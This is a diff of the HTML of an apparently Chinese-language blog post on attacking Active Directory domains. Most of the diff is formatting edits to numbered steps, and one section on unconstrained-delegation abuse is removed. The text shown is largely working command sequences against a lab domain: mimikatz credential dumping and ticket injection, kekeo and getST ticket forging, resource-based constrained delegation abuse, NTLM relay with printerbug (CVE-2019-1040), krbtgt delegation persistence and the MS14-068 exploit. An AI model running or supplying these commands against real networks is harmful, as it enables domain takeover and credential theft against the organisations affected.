@@ -39,7 +39,7 @@
 <meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_M3fFHJ-7LV.png">
 <meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_y47Ef1YU8I.png">
 <meta property="article:published_time" content="2023-07-26T13:26:53.000Z">
-<meta property="article:modified_time" content="2023-07-26T13:45:21.627Z">
+<meta property="article:modified_time" content="2023-07-26T13:56:55.585Z">
 <meta property="article:author" content="Aurey7">
 <meta property="article:tag" content="域渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -250,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          14k 字
+          13k 字
         
       </span>
     
@@ -261,7 +261,7 @@
         
         
         
-          116 分钟
+          110 分钟
         
       </span>
     
@@ -336,13 +336,9 @@
 <li>krbtgt hash</li>
 </ol>
 <h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>我们可以通过DCSync拿到的krbtgt做一个黄金票据</p>
-<ol>
-<li>获取Domain SID</li>
-</ol>
+<p>获取Domain SID</p>
 <p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_R83v5LB-KS.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<ol>
-<li>利用上面获取到的Domain SID和krbtgt制作黄金票据</li>
-</ol>
+<p>利用上面获取到的Domain SID和krbtgt制作黄金票据</p>
 <p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ZS52zRh9IQ.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gJoqbP2GKj.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <h4 id="意外情况"><a href="#意外情况" class="headerlink" title="意外情况"></a>意外情况</h4><p><strong>时钟同步</strong></p>
@@ -391,19 +387,6 @@
 <li>服务账户使用TGS访问其他服务</li>
 </ol>
 <h4 id="侦查思路：找到非约束委派账户"><a href="#侦查思路：找到非约束委派账户" class="headerlink" title="侦查思路：找到非约束委派账户"></a>侦查思路：找到非约束委派账户</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ADFind查询非约束委派普通账户</span><br>AdFind.exe -b <span class="hljs-string">&quot;DC=redteam,DC=lab&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn<br><span class="hljs-comment"># ADFind查询非约束机器账户</span><br>AdFind.exe -b <span class="hljs-string">&quot;DC=redteam,DC=lab&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn<br><span class="hljs-comment"># PowerView查询非约束委派的机器账户</span><br>powershell-import PowerView.ps1<br>powershell Get-NetComputer –unconstrained | select dnshostname, samaccountname<br></code></pre></td></tr></table></figure>
-<h4 id="利用服务账户获取管理员权限"><a href="#利用服务账户获取管理员权限" class="headerlink" title="利用服务账户获取管理员权限"></a>利用服务账户获取管理员权限</h4><p>已知被设置非约束性委派属性的服务账户的口令明文，则可以获取域管理员权限</p>
-<ol>
-<li>现在已知域内服务账号sqlsvc的明文口令，则可以使用kekeo构造sqlsvc服务账户的票据</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kekeo.exe <span class="hljs-string">&quot;tgt::ask /user:mssqlsrv /domain:redteam.lab /password:123.com /ticket:mssqlsrv.kirbi&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
-<ol>
-<li>由于sqlsvc被设置为非约束委派，因此可以利用刚才伪造的sqlsvc票据，向域服务器发起域控CIFS服务的管理员权限的TGS</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kekeo.exe <span class="hljs-string">&quot;Tgs::s4u /tgt:TGT_mssqlsrv@REDTEAM.LAB_krbtgt~redteam.lab@REDTEAM.LAB.kirbi /user:administrator@redteam.lab /service:cifs/DC2016.redteam.lab&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
-<ol>
-<li>此时内存中已经有了访问域服务器 CIFS 服务的域管理员的 TGS 票据，需要将该票据注入当前的会话中，使用 mimikatz 的 <code>kerberos::ptt</code> 命令可完成票据的注入。注入票据后，当前的会话具备了访问域服务器 C 盘目录的权限</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz.exe <span class="hljs-string">&quot;kerberos::ptt TGS_administrator@redteam.lab@REDTEAM.LAB_mssqlsrv@REDTEAM.LAB.kirbi&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
 <h4 id="利用打印机漏洞"><a href="#利用打印机漏洞" class="headerlink" title="利用打印机漏洞"></a>利用打印机漏洞</h4><p>强迫运行打印服务（Print Spooler）的主机向目标主机发起Kerberos或NTLM认真请求</p>
 <p><strong>前提条件：</strong></p>
 <ol>
@@ -443,7 +426,7 @@
 <p>使用kekeo工具申请服务票据（S4U2Proxy）</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 申请服务票据</span><br>kekeo.exe <span class="hljs-string">&quot;tgs::s4u /tgt:[0;3e7]-2-1-40e10000-WIN10-1<span class="hljs-variable">$@krbtgt</span>-REDTEAM.LAB.kirbi /user:Administrator@redteam.lab /service:cifs/DC2016.redteam.lab&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
 <p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_DzgJwnlApq.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 导入票据</span><br>mimikatz.exe <span class="hljs-string">&quot;kerberos::ptt TGS_Administrator@redteam.lab@REDTEAM.LAB_cifs~DC2016.redteam.lab@REDTEAM.LAB.kirbi&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br><span class="hljs-comment"># 访问</span><br><span class="hljs-built_in">dir</span> \\DC2016.redteam.lab\c$<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 导入票据</span><br>mimikatz.exe <span class="hljs-string">&quot;kerberos::ptt TGS_Administrator@redteam.lab@REDTEAM.LAB_cifs~DC2016.redteam.lab@REDTEAM.LAB.kirbi&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><span class="hljs-comment"># 访问</span><br><span class="hljs-built_in">dir</span> \\DC2016.redteam.lab\c$<br></code></pre></td></tr></table></figure>
 <p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ptgvPyz844.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <h4 id="使用机器账户的Hash值"><a href="#使用机器账户的Hash值" class="headerlink" title="使用机器账户的Hash值"></a>使用机器账户的Hash值</h4><p><strong>利用条件：</strong></p>
 <ol>
@@ -451,18 +434,12 @@
 <li>目标机器账户配置了约束性委派</li>
 </ol>
 <p><strong>利用过程：</strong></p>
-<ol>
-<li>使用mimikatz获取NTLM Hash值</li>
-</ol>
+<p>使用mimikatz获取NTLM Hash值</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
 <p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_M3fFHJ-7LV.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<ol>
-<li>使用getST申请服务票据</li>
-</ol>
+<p>使用getST申请服务票据</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 getST.py -dc-ip 10.10.2.20 -spn CIFS/DC2016.redteam.lab -impersonate administrator redteam.lab/WIN10-1$ -hashes :8f91f8786d308e62c609688886dc7c4c<br></code></pre></td></tr></table></figure>
-<ol>
-<li>使用票据远程访问</li>
-</ol>
+<p>使用票据远程访问</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">KRB5CCNAME=administrator.ccache python3 wmiexec.py -k redteam.lab/administrator@DC2016.redteam.lab -no-pass -dc-ip 10.10.2.20<br></code></pre></td></tr></table></figure>
 <p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_y47Ef1YU8I.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <h3 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h3><p>Resource Based Constrained Delegation（RBCD）不需要通过具备SeEnableDelegationPrivilege权限的域管理员进行修改，<strong>而是将设置属性的权限给了服务资源本身</strong>。</p>
@@ -500,21 +477,13 @@
 <li>具有管理主机加入域的用户账户</li>
 </ol>
 <p><strong>利用过程：</strong></p>
-<ol>
-<li>添加机器账户</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用addcpmputer创建机器账户</span><br>python3 addcomputer.py redteam.lab/ken:123.com -method LDAPS -computer-name CPT01\$ -computer-pass Passw0rd -dc-ip 10.10.2.20<br><br><span class="hljs-comment"># 使用bloodyAD工具创建机器账户</span><br>python3 bloodyAD.py -d redteam.lab -u ken -p <span class="hljs-string">&#x27;123.com&#x27;</span> --host 10.10.2.20 addComputer CPT01 <span class="hljs-string">&#x27;Passw0rd&#x27;</span><br><br></code></pre></td></tr></table></figure>
-<ol>
-<li>查询机器账户的SID</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 PowerView 工具查询机器账户SID</span><br>S-1-5-21-3309395417-4108617856-2168433834-1108<br><br></code></pre></td></tr></table></figure>
-<ol>
-<li>修改服务资源的委派属性，即 msDS-AllowedToActOnBehalfOfOtherIdentity</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 导入powershell Set-ExecutionPolicy Bypass -Scope Process. .\powerview.ps1</span><br>powershell-import PowerView.ps1<br>powerpick <span class="hljs-variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3309395417-4108617856-2168433834-1108)&quot;</span>;<span class="hljs-variable">$SDBytes</span> = New-Object byte[] (<span class="hljs-variable">$SD</span>.BinaryLength);<span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, 0);Get-DomainComputer WIN7-1 | Set-DomainObject -Set @&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125; -Verbose<br><span class="hljs-comment"># 查询属性</span><br>powerpick Get-DomainComputer SERVER2012 -Properties msds-allowedtoactonbehalfofotheridentity<br><span class="hljs-comment"># 域控查询命令</span><br>Get-ADComputer SERVER2012 -Properties PrincipalsAllowedToDelegateToAccount<br><span class="hljs-comment"># 清除属性</span><br>Set-DomainObject SERVER2012 -Clear <span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span> -Verbose<br><br></code></pre></td></tr></table></figure>
-<ol>
-<li>申请服务票据并利用</li>
-</ol>
+<p>添加机器账户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用addcpmputer创建机器账户</span><br>python3 addcomputer.py redteam.lab/ken:123.com -method LDAPS -computer-name CPT01\$ -computer-pass Passw0rd -dc-ip 10.10.2.20<br><br><span class="hljs-comment"># 使用bloodyAD工具创建机器账户</span><br>python3 bloodyAD.py -d redteam.lab -u ken -p <span class="hljs-string">&#x27;123.com&#x27;</span> --host 10.10.2.20 addComputer CPT01 <span class="hljs-string">&#x27;Passw0rd&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>查询机器账户的SID</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 PowerView 工具查询机器账户SID</span><br>S-1-5-21-3309395417-4108617856-2168433834-1108<br></code></pre></td></tr></table></figure>
+<p>修改服务资源的委派属性，即 msDS-AllowedToActOnBehalfOfOtherIdentity</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 导入powershell Set-ExecutionPolicy Bypass -Scope Process. .\powerview.ps1</span><br>powershell-import PowerView.ps1<br>powerpick <span class="hljs-variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3309395417-4108617856-2168433834-1108)&quot;</span>;<span class="hljs-variable">$SDBytes</span> = New-Object byte[] (<span class="hljs-variable">$SD</span>.BinaryLength);<span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, 0);Get-DomainComputer WIN7-1 | Set-DomainObject -Set @&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125; -Verbose<br><span class="hljs-comment"># 查询属性</span><br>powerpick Get-DomainComputer SERVER2012 -Properties msds-allowedtoactonbehalfofotheridentity<br><span class="hljs-comment"># 域控查询命令</span><br>Get-ADComputer SERVER2012 -Properties PrincipalsAllowedToDelegateToAccount<br><span class="hljs-comment"># 清除属性</span><br>Set-DomainObject SERVER2012 -Clear <span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span> -Verbose<br></code></pre></td></tr></table></figure>
+<p>申请服务票据并利用</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用getST.py申请票据</span><br>python3 getST.py redteam.lab/CPT01$:Passw0rd -spn cifs/SERVER2012.redteam.lab -impersonate administrator -dc-ip 10.10.2.20<br><span class="hljs-comment"># 导入票据</span><br><span class="hljs-built_in">export</span> KRB5CCNAME=/root/Desktop/administrator.ccache<br><span class="hljs-comment"># 直接登录</span><br>python3 wmiexec.py -k redteam.lab/administrator@SERVER2012.redteam.lab -no-pass<br>python3 psexec.py -k redteam.lab/administrator@SERVER2012.redteam.lab -no-pass<br></code></pre></td></tr></table></figure>
 <h4 id="已知Account-Operators组用户拿下主机"><a href="#已知Account-Operators组用户拿下主机" class="headerlink" title="已知Account Operators组用户拿下主机"></a>已知Account Operators组用户拿下主机</h4><p>可以获得域内除了域控之外的所有机器</p>
 <p><strong>利用条件：</strong></p>
@@ -524,21 +493,13 @@
 </ol>
 <p>Acount Operators组成员能修改<strong>域内任意主机</strong><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性</p>
 <p><strong>利用过程：</strong></p>
-<ol>
-<li>查询Account Operators组成员</li>
-</ol>
+<p>查询Account Operators组成员</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adfind.exe -h 10.10.2.20:389 -s subtree -b CN=<span class="hljs-string">&quot;Account Operators&quot;</span>,CN=Builtin,DC=redteam,DC=lab member<br></code></pre></td></tr></table></figure>
-<ol>
-<li>创建机器账户</li>
-</ol>
+<p>创建机器账户</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用bloodyAD.py创建机器账户</span><br>python3 bloodyAD.py -d redteam.lab -u mark -p <span class="hljs-string">&#x27;123.com&#x27;</span> --host 10.10.2.20 addComputer CPT02 <span class="hljs-string">&#x27;Passw0rd&#x27;</span><br></code></pre></td></tr></table></figure>
-<ol>
-<li>设置委派属性</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用PowerView工具查询机器账户SID</span><br>powerpick Get-NetComputer CPT02 -Properties objectsid<br>S-1-5-21-3309395417-4108617856-2168433834-1112<br><br><span class="hljs-comment"># 修改服务资源msDS-AllowedToActOnBehalfOfOtherIdentity属性</span><br>powerpick <span class="hljs-variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3309395417-4108617856-2168433834-1112)&quot;</span>;<span class="hljs-variable">$SDBytes</span> = New-Object byte[] (<span class="hljs-variable">$SD</span>.BinaryLength);<span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, 0);Get-DomainComputer WIN7-1 | Set-DomainObject -Set @&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125; -Verbose<br><br><span class="hljs-comment"># 查询属性</span><br>powerpick Get-DomainComputer WIN7-1 -Properties msds-allowedtoactonbehalfofotheridentity<br><br></code></pre></td></tr></table></figure>
-<ol>
-<li>申请服务票据并利用</li>
-</ol>
+<p>设置委派属性</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用PowerView工具查询机器账户SID</span><br>powerpick Get-NetComputer CPT02 -Properties objectsid<br>S-1-5-21-3309395417-4108617856-2168433834-1112<br><br><span class="hljs-comment"># 修改服务资源msDS-AllowedToActOnBehalfOfOtherIdentity属性</span><br>powerpick <span class="hljs-variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3309395417-4108617856-2168433834-1112)&quot;</span>;<span class="hljs-variable">$SDBytes</span> = New-Object byte[] (<span class="hljs-variable">$SD</span>.BinaryLength);<span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, 0);Get-DomainComputer WIN7-1 | Set-DomainObject -Set @&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125; -Verbose<br><br><span class="hljs-comment"># 查询属性</span><br>powerpick Get-DomainComputer WIN7-1 -Properties msds-allowedtoactonbehalfofotheridentity<br></code></pre></td></tr></table></figure>
+<p>申请服务票据并利用</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建服务票据</span><br>python3 getST.py redteam.lab/CPT02$:Passw0rd -spn cifs/WIN7-1.redteam.lab -impersonate administrator -dc-ip 10.10.2.20<br><br><span class="hljs-comment"># 导入票据</span><br><span class="hljs-built_in">export</span> KRB5CCNAME=/root/Desktop/administrator.ccache<br><br><span class="hljs-comment"># 直接登录</span><br>python3 wmiexec.py -k redteam.lab/administrator@WIN7-1.redteam.lab -no-pass<br>python3 psexec.py -k redteam.lab/administrator@WIN7-1.redteam.lab -no-pass<br></code></pre></td></tr></table></figure>
 <h4 id="结合HTML-Relay攻击拿下主机（CVE-2019-1040）"><a href="#结合HTML-Relay攻击拿下主机（CVE-2019-1040）" class="headerlink" title="结合HTML Relay攻击拿下主机（CVE-2019-1040）"></a>结合HTML Relay攻击拿下主机（CVE-2019-1040）</h4><p>绕过NTLM MIC校验+打印机漏洞+NTLM Relay+基于资源的约束性委派组合攻击</p>
 <p><strong>利用条件：</strong></p>
@@ -547,25 +508,15 @@
 <li>能创建机器账户</li>
 </ol>
 <p><strong>利用过程：</strong></p>
-<ol>
-<li>创建机器账户</li>
-</ol>
+<p>创建机器账户</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 bloodyAD.py -d redteam.lab -u ken -p <span class="hljs-string">&#x27;123.com&#x27;</span> --host 10.10.2.20 addComputer CPT03 <span class="hljs-string">&#x27;Passw0rd&#x27;</span><br></code></pre></td></tr></table></figure>
-<ol>
-<li>监听认证请求</li>
-</ol>
+<p>监听认证请求</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 ntlmrelayx.py -t ldap://10.10.2.20 -smb2support --remove-mic --delegate-access --escalate-user CPT03\$<br></code></pre></td></tr></table></figure>
-<ol>
-<li>打印机漏洞执行强制认证</li>
-</ol>
+<p>打印机漏洞执行强制认证</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 printerbug.py redteam.lab/ken:123.com@10.10.2.50 10.10.2.77<br></code></pre></td></tr></table></figure>
-<ol>
-<li>申请服务票据</li>
-</ol>
+<p>申请服务票据</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 getST.py redteam.lab/CPT03\$:Passw0rd -spn CIFS/SERVER2012.redteam.lab -impersonate Administrator -dc-ip 10.10.2.20<br></code></pre></td></tr></table></figure>
-<ol>
-<li>使用服务票据</li>
-</ol>
+<p>使用服务票据</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 注入票据</span><br><span class="hljs-built_in">export</span> KRB5CCNAME=Administrator.ccache<br><br><span class="hljs-comment"># 远程访问</span><br>python3 smbexec.py -target-ip 10.10.2.50 -k SERVER2012.redteam.lab -no-pass<br></code></pre></td></tr></table></figure>
 <h4 id="krbtgt用户委派"><a href="#krbtgt用户委派" class="headerlink" title="krbtgt用户委派"></a>krbtgt用户委派</h4><p>在获取到域控权限后，可以对krbtgt用户设置委派属性，以实现维持权限的目的</p>
 <p><strong>利用条件：</strong></p>
@@ -573,19 +524,13 @@
 <li>获取域控权限</li>
 </ol>
 <p><strong>利用过程：</strong></p>
-<ol>
-<li>设置委派属性</li>
-</ol>
+<p>设置委派属性</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建机器账户</span><br>python3 bloodyAD.py -d redteam.lab -u ken -p <span class="hljs-string">&#x27;123.com&#x27;</span> --host 10.10.2.20 addComputer CPT04 <span class="hljs-string">&#x27;Passw0rd&#x27;</span><br><br><span class="hljs-comment"># 设置krbtgt委派权限 | 查询</span><br>Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount CPT04$<br>Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount<br></code></pre></td></tr></table></figure>
-<ol>
-<li>申请&amp;使用票据</li>
-</ol>
+<p>申请&amp;使用票据</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 getST.py redteam.lab/CPT04\$:Passw0rd -spn krbtgt -impersonate Administrator -dc-ip 10.10.2.20<br><span class="hljs-built_in">export</span> KRB5CCNAME=Administrator.ccache<br><br>python3 smbexec.py -k administrator@DC2016.redteam.lab -no-pass -dc-ip 10.10.2.20<br>KRB5CCNAME=Administrator.ccache | python3 smbexec.py -k administrator@DC2016.redteam.lab -no-pass -dc-ip 10.10.2.20<br></code></pre></td></tr></table></figure>
 <h2 id="PAC攻击"><a href="#PAC攻击" class="headerlink" title="PAC攻击"></a>PAC攻击</h2><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>MS14-068漏洞的原因是KDC无法正确检查PAC中的有效签名，由于其实现签名的加密允许所有的签名算法，只要客户端指定任意签名算法，KDC服务就会使用指定的算法进行签名验证，因此可以利用不需要相关密钥的算法，如MD5，实现内容的任意更改，导致用户可以自己构造一张PAC，伪造用户的SID和所在的组。</p>
 <p>那么通过伪造的PAC，加入域管相关信息，访问域控服务，KDC会认为当前用户有权限，从而把这个用户当作域管组的成员，进而达到提升至域管理员的效果</p>
-<ol>
-<li>在WIN2008上利用kekeo执行如下命令，便可以成功访问域控CIFS服务</li>
-</ol>
+<p>在WIN2008上利用kekeo执行如下命令，便可以成功访问域控CIFS服务</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">kekeo.exe <span class="hljs-string">&quot;exploit::ms14068 /domain:aurey.com /user:username /password:password /ptt&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
 <p>除此之外，也可以利用impacket中的goldenPac，直接返回一个交互式Shell</p>
 <h3 id="CVE-2021-42278-amp-CVE-2021-42287（NoPac）"><a href="#CVE-2021-42278-amp-CVE-2021-42287（NoPac）" class="headerlink" title="CVE-2021-42278 &amp; CVE-2021-42287（NoPac）"></a>CVE-2021-42278 &amp; CVE-2021-42287（NoPac）</h3><p>CVE-2021-42278：机器账户的名字一般以<code>$</code>结尾，但AD没有对域内机器账户名做验证。导致机器用户名可以被冒用</p>
